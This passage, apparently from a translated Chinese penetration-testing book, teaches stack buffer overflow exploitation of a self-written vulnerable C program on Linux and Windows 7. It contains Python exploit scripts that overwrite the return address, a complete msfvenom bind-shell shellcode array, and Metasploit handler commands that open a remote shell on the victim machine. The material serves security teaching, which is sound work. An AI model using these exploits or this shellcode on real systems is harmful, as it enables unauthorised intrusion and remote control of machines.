此外，这里`shell_pwn`永远不会被执行，因为我们从未在这里调用它，但现在我们知道如何做。首先，让我们编译它：

```
 $ gcc -fno-stack-protector -z execstack exec.c -o exec
```

然后，在 GDB 中打开我们的代码：

```
$ gdb ./exec
```

然后，在`main`函数处设置断点：

```
$ break main
```

好的，现在让我们准备我们的利用程序来确认 RIP 寄存器的确切位置：

```
#!/usr/bin/python

 buffer = ''
 buffer += 'a'*24
 buffer += 'b'*6
 f = open("input.txt", "w")
 f.write(buffer)
```

然后，执行我们的利用程序：

```
$ ./exploit.py
```

现在，从 GDB 中运行以下命令：

```
$ run $(cat input.txt)
```

然后，它将在`main`函数处触发断点：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00243.jpeg)

按*C*然后*Enter*继续：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00244.jpeg)

是的，它在抱怨我们的 6 个`b`字符，`0x0000626262626262`，所以现在我们走上了正确的道路。现在，让我们找到我们 shellcode 的地址：

```
$ disassemble shell_pwn
```

上述命令的输出可以在以下屏幕截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00245.jpeg)

第一条指令的地址是`0x000000000040060d`。此外，我们可以使用`print`函数：

```
$ print shell_pwn
```

上述命令的输出可以在以下屏幕截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00246.jpeg)

完美！现在，让我们构建我们的最终利用：

```
#!/usr/bin/python
 from struct import *

 buffer = ''
 buffer += 'a'*24
 buffer += pack("<Q", 0x00000040060d)
 f = open("input.txt", "w")
 f.write(buffer)
```

然后，执行它：

```
$ ./exploit.py
```

然后，在 GDB 内部，运行以下命令：

```
$ run $(cat input.txt)
```

然后，代码将在`main`函数处暂停；按*C*继续：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00247.jpeg)

现在我们有了一个 shell；让我们尝试使用`$ cat /etc/issue`来执行它：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00248.jpeg)

让我们确认一下，使用我们的 bash shell 而不是 GDB：

```
$ ./exec $(cat input.txt)
```

上述命令的输出可以在以下屏幕截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00249.jpeg)

让我们尝试执行一些东西：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00250.jpeg)

它奏效了！

# Windows 上的堆栈溢出

现在，让我们尝试之前的易受攻击代码来利用 Windows 7 上的堆栈溢出。我们甚至不必在 Windows 上禁用任何安全机制，如**地址空间布局随机化**（**ASLR**）或**数据执行防护**（**DEP**）；我们将在第十二章中讨论安全机制，*检测和预防* - 我们开始吧？

让我们使用 Code::Blocks 尝试我们的易受攻击代码：

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int copytobuffer(char* input)
{
     char buffer[15];
     strcpy (buffer,input);
     return 0;
}

void letsprint()
{
    printf("Hey!! , you succeeded\n");
    exit(0);
}

void main (int argc, char *argv[])
{
    int local_variable = 1;
    copytobuffer(argv[1]);
    exit(0);
}
```

简单地打开 Code::Blocks 并导航到文件|新建|空文件。

然后，编写我们的易受攻击代码。转到文件|保存文件，然后将其保存为`buffer2.c`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00251.jpeg)

现在，让我们通过导航到构建|构建来构建我们的代码。

让我们尝试看看幕后发生了什么；以管理员身份打开 Immunity Debugger。

然后，转到文件|打开并选择`buffer2`。在这里，将我们的参数输入为`aaaaaaaaaaaaaaaaaaaaaaaaaaabbbb`（27 个`a`和 4 个`b`的字符）；稍后我们将知道如何获得我们有效负载的长度：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00252.jpeg)

现在，我们可以看到我们的四个窗口。运行程序一次。之后，我们就到了程序的入口点：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00253.jpeg)

现在，再次运行程序并注意状态栏：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00254.jpeg)

当执行`62626262`时，程序崩溃并给出访问冲突，这些是我们的字符`b`的 ASCII 码，最重要的是要注意寄存器（FPU）窗口：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00255.jpeg)

指令指针指向`b`字符`62626262`，太完美了！

现在，让我们尝试定位我们的函数。从 Immunity Debugger 中，导航到调试|重新启动。

现在我们重新开始；运行程序一次，然后右键单击反汇编窗口，导航到搜索|所有引用的文本字符串：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00256.jpeg)

在这里，我们正在搜索我们的字符串，它位于`letsprint`函数内部，`Hey!! , you succeeded\n`。

将弹出一个新窗口：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00257.jpeg)

第三个是我们的字符串，但由于`exit(0)`函数的存在，它是不可读的。您可以通过编译另一个版本并执行相同的步骤来确保，然后您将能够读取我们的字符串。

这里的地址不是固定的-您可能会得到不同的地址。

双击我们的字符串，然后 Immunity Debugger 会将您准确设置在地址`0x00401367`处的字符串上：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00258.jpeg)

实际上，我们不需要我们的字符串，但我们需要定位`letsprint`函数。继续向上直到到达上一个函数的末尾（`RETN`指令）。然后，下一条指令将是`letsprint`函数的开始：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00259.jpeg)

就是这样！地址`0x0040135f`应该是`letsprint`函数的开始。现在，让我们确认一下。打开 IDLE（Python GUI）并导航到文件|新建窗口：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00260.jpeg)

在新窗口中，编写我们的利用程序：

```
#!/usr/bin/python
from struct import *
buffer = ''
buffer += 'a'*27
buffer += pack("<Q", 0x0040135f)
f = open("input.txt", "w")
f.write(buffer)
```

然后，将其保存为`exploit.py`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00261.jpeg)

点击 IDLE 窗口上的运行，这将在当前工作目录中生成一个新文件`input.txt`。

打开`input.txt`文件：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00262.jpeg)

这是我们的有效载荷；复制输出文件的内容。然后，返回到 Immunity Debugger，通过导航到文件|打开，然后将有效载荷粘贴到参数中并选择`buffer2`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00263.jpeg)

然后，启动 Immunity Debugger：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00264.jpeg)

现在，运行程序；然后，它将暂停在程序的入口点：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00265.jpeg)

现在，再次运行程序一次：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00266.jpeg)

程序正常退出，退出代码为`0`。现在，让我们来看看 Immunity 的 CLI：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00267.jpeg)

它奏效了！让我们来看看堆栈窗口：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00268.jpeg)

请注意，`a`字符被注入到堆栈中，`letsprint`地址被正确注入。

现在，让我们尝试注入一个 shellcode，而不是使用`letsprint`函数，使用 Metasploit 生成 Windows 的 shellcode：

```
$ msfvenom -p windows/shell_bind_tcp -b'\x00\x0A\x0D' -f c
```

前面命令的输出可以在下面的截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00269.jpeg)

我们可以在使用之前测试这个 shellcode：

```
#include<stdio.h>
#include<string.h>

unsigned char code[] =
"\xda\xcf\xd9\x74\x24\xf4\xbd\xb8\xbe\xbf\xa8\x5b\x29\xc9\xb1"
"\x53\x83\xeb\xfc\x31\x6b\x13\x03\xd3\xad\x5d\x5d\xdf\x3a\x23"
"\x9e\x1f\xbb\x44\x16\xfa\x8a\x44\x4c\x8f\xbd\x74\x06\xdd\x31"
"\xfe\x4a\xf5\xc2\x72\x43\xfa\x63\x38\xb5\x35\x73\x11\x85\x54"
"\xf7\x68\xda\xb6\xc6\xa2\x2f\xb7\x0f\xde\xc2\xe5\xd8\x94\x71"
"\x19\x6c\xe0\x49\x92\x3e\xe4\xc9\x47\xf6\x07\xfb\xd6\x8c\x51"
"\xdb\xd9\x41\xea\x52\xc1\x86\xd7\x2d\x7a\x7c\xa3\xaf\xaa\x4c"
"\x4c\x03\x93\x60\xbf\x5d\xd4\x47\x20\x28\x2c\xb4\xdd\x2b\xeb"
"\xc6\x39\xb9\xef\x61\xc9\x19\xcb\x90\x1e\xff\x98\x9f\xeb\x8b"
"\xc6\x83\xea\x58\x7d\xbf\x67\x5f\x51\x49\x33\x44\x75\x11\xe7"
"\xe5\x2c\xff\x46\x19\x2e\xa0\x37\xbf\x25\x4d\x23\xb2\x64\x1a"
"\x80\xff\x96\xda\x8e\x88\xe5\xe8\x11\x23\x61\x41\xd9\xed\x76"
"\xa6\xf0\x4a\xe8\x59\xfb\xaa\x21\x9e\xaf\xfa\x59\x37\xd0\x90"
"\x99\xb8\x05\x0c\x91\x1f\xf6\x33\x5c\xdf\xa6\xf3\xce\x88\xac"
"\xfb\x31\xa8\xce\xd1\x5a\x41\x33\xda\x75\xce\xba\x3c\x1f\xfe"
"\xea\x97\xb7\x3c\xc9\x2f\x20\x3e\x3b\x18\xc6\x77\x2d\x9f\xe9"
"\x87\x7b\xb7\x7d\x0c\x68\x03\x9c\x13\xa5\x23\xc9\x84\x33\xa2"
"\xb8\x35\x43\xef\x2a\xd5\xd6\x74\xaa\x90\xca\x22\xfd\xf5\x3d"
"\x3b\x6b\xe8\x64\x95\x89\xf1\xf1\xde\x09\x2e\xc2\xe1\x90\xa3"
"\x7e\xc6\x82\x7d\x7e\x42\xf6\xd1\x29\x1c\xa0\x97\x83\xee\x1a"
"\x4e\x7f\xb9\xca\x17\xb3\x7a\x8c\x17\x9e\x0c\x70\xa9\x77\x49"
"\x8f\x06\x10\x5d\xe8\x7a\x80\xa2\x23\x3f\xb0\xe8\x69\x16\x59"
"\xb5\xf8\x2a\x04\x46\xd7\x69\x31\xc5\xdd\x11\xc6\xd5\x94\x14"
"\x82\x51\x45\x65\x9b\x37\x69\xda\x9c\x1d";

int main()
{
    printf("Shellcode Length: %d\n", (int)strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}
```

然后，构建并运行它：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00270.jpeg)

现在，它正在等待我们的连接。从我们的攻击机器上，启动 Metasploit：

```
$ msfconsole
```

然后，选择处理程序以连接到受害者机器：

```
 $ use exploit/multi/handler
```

现在，选择我们的有效载荷，即`windows/shell_bind_tcp`：

```
$ set payload windows/shell_bind_tcp
```

然后，设置受害者机器的 IP 地址：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00271.jpeg)

现在，设置 rhost：

```
$ set rhost 192.168.129.128
```

然后，让我们开始：

```
$ run
```

前面命令的输出可以在下面的截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00272.jpeg)

现在，会话开始于`session 1`：

```
$ session 1
```

前面命令的输出可以在下面的截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00273.jpeg)

我们现在在受害者机器内部。退出此会话，让我们回到我们的代码。因此，我们的最终代码应该是这样的：

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int shell_pwn()
{
unsigned char code[] =
"\xda\xcf\xd9\x74\x24\xf4\xbd\xb8\xbe\xbf\xa8\x5b\x29\xc9\xb1"
"\x53\x83\xeb\xfc\x31\x6b\x13\x03\xd3\xad\x5d\x5d\xdf\x3a\x23"
"\x9e\x1f\xbb\x44\x16\xfa\x8a\x44\x4c\x8f\xbd\x74\x06\xdd\x31"
"\xfe\x4a\xf5\xc2\x72\x43\xfa\x63\x38\xb5\x35\x73\x11\x85\x54"
"\xf7\x68\xda\xb6\xc6\xa2\x2f\xb7\x0f\xde\xc2\xe5\xd8\x94\x71"
"\x19\x6c\xe0\x49\x92\x3e\xe4\xc9\x47\xf6\x07\xfb\xd6\x8c\x51"
"\xdb\xd9\x41\xea\x52\xc1\x86\xd7\x2d\x7a\x7c\xa3\xaf\xaa\x4c"
"\x4c\x03\x93\x60\xbf\x5d\xd4\x47\x20\x28\x2c\xb4\xdd\x2b\xeb"
"\xc6\x39\xb9\xef\x61\xc9\x19\xcb\x90\x1e\xff\x98\x9f\xeb\x8b"
"\xc6\x83\xea\x58\x7d\xbf\x67\x5f\x51\x49\x33\x44\x75\x11\xe7"
"\xe5\x2c\xff\x46\x19\x2e\xa0\x37\xbf\x25\x4d\x23\xb2\x64\x1a"
"\x80\xff\x96\xda\x8e\x88\xe5\xe8\x11\x23\x61\x41\xd9\xed\x76"
"\xa6\xf0\x4a\xe8\x59\xfb\xaa\x21\x9e\xaf\xfa\x59\x37\xd0\x90"
"\x99\xb8\x05\x0c\x91\x1f\xf6\x33\x5c\xdf\xa6\xf3\xce\x88\xac"
"\xfb\x31\xa8\xce\xd1\x5a\x41\x33\xda\x75\xce\xba\x3c\x1f\xfe"
"\xea\x97\xb7\x3c\xc9\x2f\x20\x3e\x3b\x18\xc6\x77\x2d\x9f\xe9"
"\x87\x7b\xb7\x7d\x0c\x68\x03\x9c\x13\xa5\x23\xc9\x84\x33\xa2"
"\xb8\x35\x43\xef\x2a\xd5\xd6\x74\xaa\x90\xca\x22\xfd\xf5\x3d"
"\x3b\x6b\xe8\x64\x95\x89\xf1\xf1\xde\x09\x2e\xc2\xe1\x90\xa3"
"\x7e\xc6\x82\x7d\x7e\x42\xf6\xd1\x29\x1c\xa0\x97\x83\xee\x1a"
"\x4e\x7f\xb9\xca\x17\xb3\x7a\x8c\x17\x9e\x0c\x70\xa9\x77\x49"
"\x8f\x06\x10\x5d\xe8\x7a\x80\xa2\x23\x3f\xb0\xe8\x69\x16\x59"
"\xb5\xf8\x2a\x04\x46\xd7\x69\x31\xc5\xdd\x11\xc6\xd5\x94\x14"
"\x82\x51\x45\x65\x9b\x37\x69\xda\x9c\x1d";

    printf("Shellcode Length: %d\n", (int)strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}

int copytobuffer(char* input)
{
    char buffer[15];
    strcpy (buffer,input);
    return 0;
}

void main (int argc, char *argv[])
{
    int local_variable = 1;
    copytobuffer(argv[1]);
    exit(0);
}
```

现在，构建它，并让我们在 Immunity Debugger 中运行它，以找到`shell_pwn`函数的地址。以管理员身份启动 Immunity Debugger，并选择我们带有任何参数的新代码：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00274.jpeg)

然后，运行程序一次。现在，我们在程序的入口点：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00275.jpeg)

右键单击主屏幕，导航到搜索|所有引用的文本字符串：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00276.jpeg)

你看到`Shellcode Length`了吗？这是`shell_pwn`函数中的一个字符串；现在双击它：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00277.jpeg)

程序将我们设置在`Shellcode Length`字符串的确切位置。现在，让我们向上移动，直到我们达到函数的起始地址：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00278.jpeg)

就是在地址`0x00401340`。现在，让我们设置我们的利用代码：

```
#!/usr/bin/python
 from struct import *
 buffer = ''
 buffer += 'a'*27
 buffer += pack("<Q", 0x00401340)
 f = open("input.txt", "w")
 f.write(buffer)
```

现在，运行利用代码以更新`input.txt`；然后，打开`input.txt`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00279.jpeg)

然后，复制其中的内容。返回到 Immunity Debugger，再次打开程序并粘贴有效载荷：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00280.jpeg)

然后，再次运行程序两次。代码仍在运行：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00281.jpeg)

还要注意状态栏：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00282.jpeg)

我们的 shellcode 现在正在运行并等待我们的连接。让我们回到我们的攻击机器上，设置处理程序以连接到受害者机器：

```
$ msfconsole
$ use exploit/multi/handler
$ set payload windows/shell_bind_tcp
$ set rhost 192.168.129.128
$ run
```

前面命令的输出可以在下面的截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00283.jpeg)

连接已在`session 2`上建立：

```
 $ session 2
```

前面命令的输出可以在下面的截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00284.jpeg)

它奏效了！

# 总结

在这一点上，我们知道了如何在 Linux 和 Windows 上进行缓冲区溢出攻击。此外，我们知道如何利用堆栈溢出。

在下一章中，我们将讨论更多的技术，比如如何定位和控制指令指针，如何找到有效载荷的位置，以及更多关于缓冲区溢出攻击的技术。
